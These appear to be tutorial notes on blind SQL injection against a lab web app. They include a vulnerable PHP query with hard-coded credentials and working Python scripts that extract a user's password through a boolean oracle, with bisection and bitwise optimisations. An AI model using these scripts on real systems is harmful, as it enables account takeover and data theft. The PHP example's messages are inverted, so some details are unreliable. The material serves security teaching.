# Blind SQL Injection

- **Non-Blind SQL Injection**
    - Direct results of queries are returned to the attacker.
    - Example: vulnerable search field → `UNION SELECT ... FROM information_schema.tables;--` to list tables.
    - Easier and faster to exploit.
- **Blind SQL Injection**
    - Query results are **not directly visible** to the attacker.
    - Attacker infers results indirectly through responses.
    - Two main types:
        - **Boolean-based (Content-based):** Response differences (page length, content) reveal True/False.
        - **Time-based:** Injects delays (`SLEEP()`) → response time shows True/False.
    - Time-based can be used everywhere Boolean-based works, but not vice versa.
- **Cause:** Same as any SQLi → lack of proper input sanitization.

---

### **Example of Boolean-based SQLi**

```php
<?php
...
$connectionInfo = Array("UID" => "db_user", "PWD" => "db_P@55w0rd#", "Database" => "prod");
$conn = sqlsrv_connect("SQL05", $connectionInfo);
$sql = "SELECT * FROM accounts WHERE email = '" . $_POST['email'] . "'";
$stmt = sqlsrv_query($conn, $sql);
$row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC);
if ($row === null) {
    echo "Email found";
} else {
    echo "Email not found";
}
...
?>
```

---

![image.png](Blind%20SQL%20Injection/image.png)

---

## **1. Designing the Oracle**

Design an `oracle` that we can send queries to and receive either `true | false`

Let's say we want to evaluate a basic query (`q`). Since we know the username `maria` exists in the system, we can add `' AND q-- -` to see if our target query evaluates as `true` or `false`. This works because we know the server should result `status:taken` for `maria` and so if it remains `status:taken` then it means `q` is evaluated as `true`, and if it returns `status:available` then it means `q` evaluated as `false`.

```sql
SELECT Username FROM Users WHERE Username = 'maria' AND q-- -'
```

For example, to test the query `1=1` we can inject `maria' AND 1=1-- -` and receive the result `status:taken` which indicates the server evaluated it as `true`.

![image.png](Blind%20SQL%20Injection/image%201.png)

Likewise, we can test the query `1=0` by injecting `maria' AND 1=0-- -` and receive the response `status:available` indicating the server evaluated it as `false`

![image.png](Blind%20SQL%20Injection/image%202.png)

<aside>
💡

**Note:** We must use a username that is already taken, like `maria` for this web app or any other user we register. This is so a query that returns true would give us `taken`. Otherwise, if we use a username that is not taken, then the output of any query would be `available`, whether it's true or false.

</aside>

## **Practice**

In Python, we can script this as follows. The function `oracle(q)` URL-encodes our payload (`maria' AND (q)-- -`), and then sends it in a GET request to `api/check-username.php`. Upon receiving the response, it checks if the value of `status` is `taken` or `available`, indicating `true` or `false` query evaluations respectively.

```python
#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus

# The user we are targeting
target = "maria"

# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    p = quote_plus(f"{target}' AND ({q})-- -")
    r = requests.get(
        f"http://192.168.43.37/api/check-username.php?u={p}"
    )
    j = json.loads(r.text)
    return j['status'] == 'taken'

# Check if oracle evalutes `1=1` and `1=0` as expected
assert oracle("1=1")
assert not oracle("1=0")
```

```python
# Example
for i in range(100):
    if not oracle(f"(select count(*) from users) > {i}"):
        print("Rows:", i)
```

---

## **2. Extracting Data**

### **Finding the Length**

- The first thing we have to do is find the length of the password
- We can do this by using [LEN(string)](https://learn.microsoft.com/en-us/sql/t-sql/functions/len-transact-sql?view=sql-server-ver16), starting from `1` and going up until we get a positive result

```python
# Get the target's password length
length = 0
# Loop until the value of `length` matches `LEN(password)`
while not oracle(f"LEN(password)={length}"):
    length += 1
print(f"[*] Password length = {length}")

# Output: 32
```

### **Dumping the Characters**

- In SQL, we can get a single character from a column with  [SUBSTRING(expression, start, length)](https://learn.microsoft.com/en-us/sql/t-sql/functions/substring-transact-sql?view=sql-server-ver16)
- In this case we are interested in the `N-th` character of the `password`, so we'd use `SUBSTRING(password, N, 1)`
- Next, to make things a bit simpler, we can convert this character into a decimal value using [ASCII(character)](https://learn.microsoft.com/en-us/sql/t-sql/functions/ascii-transact-sql?view=sql-server-ver16)
- ASCII characters have decimal values from [0 to 127](https://www.asciitable.com/), so we can simply ask the server if `ASCII(SUBSTRING(password, N, 1))=C` for values of `C` in `[0,127]` (32 to 126 printable)

**Example first char**
`maria' AND ASCII(SUBSTRING(password,1,1))=0-- -`

Now, if we send a query with the above injection, we get `available`, meaning the first character is not ASCII character `0`

This is expected since the first ASCII character is a `null` character. This is why it may make more sense to limit our search to printable ASCII characters, which range from 32 to 126. 

```python
# Dump the target's password
print("[*] Password = ", end='')
# Loop through all character indices in the password. SQL starts with 1, not 0
for i in range(1, length + 1):
   # Loop through all decimal values for printable ASCII characters (0x20-0x7E)
   for c in range(32,127):
        if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
            print(chr(c), end='')
            sys.stdout.flush()
print()
```

---

## **Optimizing**

### **Bisection (Divide & Conquer)**

<aside>
💡

**Tip:** You may also set the lower bound to 32 to limit the characters to printable ASCII ones, like we did in the previous section.

</aside>

```python
# Dump the target's password (Bisection)
print("[*] Password = ", end='')
for i in range(1, length + 1):
    low = 0
    high = 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"ASCII(SUBSTRING(password,{i},1)) BETWEEN {low} AND {mid}"):
            high = mid -1
        else:
            low = mid + 1
    print(chr(low), end='')
    sys.stdout.flush()
print()
```

### **SQL-Anding**

`SQL-Anding` is another algorithm we can use to reduce the number of requests necessary. It involves thinking a little bit in binary. ASCII characters have values `0-127`, which in binary are `00000000-01111111`. Since the `most significant bit` is always a `0`, we only need to dump `7` of these bits. We can dump bits by having the server evaluate bitwise-and queries which are `true` if the targeted bit is a `1`, and `false` if the bit is a `0`.

For example, the number `23` in binary is `00010111`, therefore `23 & 4` is `4` and `23 & 8` is `0`. We can set up a query like `ASCII(SUBSTRING(password,N,1)) & X) > 0` to test if the `N'th` character of `password` bitwise-and `X` is bigger than 0 or not to see if the bit which corresponds to `2^X` is a `1` or `0`.

```bash
Target = '9' = 57

Is <target> bitwise-and 1 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 1) > 0
-> Yes
-> Dump = ......1

Is <target> bitwise-and 2 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 2) > 0
-> No
-> Dump = .....01

Is <target> bitwise-and 4 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 4) > 0
-> No
-> Dump = ....001

Is <target> bitwise-and 8 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 8) > 0
-> Yes
-> Dump = ...1001

Is <target> bitwise-and 16 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 16) > 0
-> Yes
-> Dump = ..11001

Is <target> bitwise-and 32 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 32) > 0
-> Yes
-> Dump = .111001

Is <target> bitwise-and 64 bigger than 0?
-> (ASCII(SUBSTRING(password,2,1)) & 64) > 0
-> No
-> Dump = 0111001

Dump = 0111001 = 57 = '9'
```

```python
# Dump the target's password (SQL-Anding)
print("[*] Password = ", end='')
for i in range(1, length + 1):
    c = 0
    for p in range(7):
        if oracle(f"ASCII(SUBSTRING(password,{i},1))&{2**p}>0"):
            c |= 2**p
    print(chr(c), end='')
    sys.stdout.flush()
print()

```